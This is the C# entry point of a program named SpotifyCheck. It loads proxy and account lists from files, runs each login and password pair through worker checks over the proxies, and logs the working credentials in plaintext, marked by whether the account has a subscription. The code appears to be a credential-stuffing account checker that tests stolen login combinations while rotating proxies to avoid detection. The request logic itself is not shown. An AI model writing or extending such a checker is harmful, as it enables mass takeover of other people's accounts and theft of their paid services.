// See https://aka.ms/new-console-template for more information
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using NLog.Extensions.Logging;
using SpotifyCheck;
using SpotifyCheck.Check;
using SpotifyCheck.DataReaders;
using SpotifyCheck.Models;

var configuration = new ConfigurationBuilder().SetBasePath($"{Directory.GetCurrentDirectory()}\\Configurations").AddConfigs()
    .AddSpotifyConfigs().Build();

var services = new ServiceCollection().AddStartup(configuration).AddSpotifyStartup(configuration).AddLogging(
    loggingBuilder =>
    {
        loggingBuilder.ClearProviders();
        loggingBuilder.SetMinimumLevel(LogLevel.Trace);
        loggingBuilder.AddNLog(configuration);
    }
).BuildServiceProvider();

ServiceCollectionProxy.SetServiceProvider(services);
var logger = services.GetService<ILogger<Program>>();
var workerMessageHandler = services.GetService<WorkerMessageHandler>();
var proxiesPath = configuration.GetSection("AppOptions:ProxiesPath").Value;
var proxyDataReader = services.GetService<ProxyDataReader>();
await foreach (var proxy in proxyDataReader!.Read(proxiesPath!)) workerMessageHandler!.AddProxy(proxy);
var accountsPath = configuration.GetSection("AppOptions:AccountsPath").Value;
var accountDataReader = services.GetService<AccountDataReader>();

await foreach (var account in accountDataReader!.Read(accountsPath!))
    workerMessageHandler!.AddToQueue(new WorkerContext(account, success => OnDone(success), error => OnFail(error)));

void OnDone(AccountSuccess accountSuccess)
{
    if (accountSuccess.HasSubscription)
        logger!.LogDebug(
            "[VALID|SUB]{AccountLogin}:{AccountPassword}", accountSuccess.Account.Login, accountSuccess.Account.Password
        );
    else
        logger!.LogDebug(
            "[VALID|NOT SUB]{AccountLogin}:{AccountPassword}", accountSuccess.Account.Login, accountSuccess.Account.Password
        );
}

void OnFail(AccountError accountError)
{
    logger!.LogError(
        "[UNKNOWN ERROR] {MessageId} {AccountLogin}:{AccountPassword}", accountError.MessageId, accountError.Account.Login,
        accountError.Account.Password
    );
}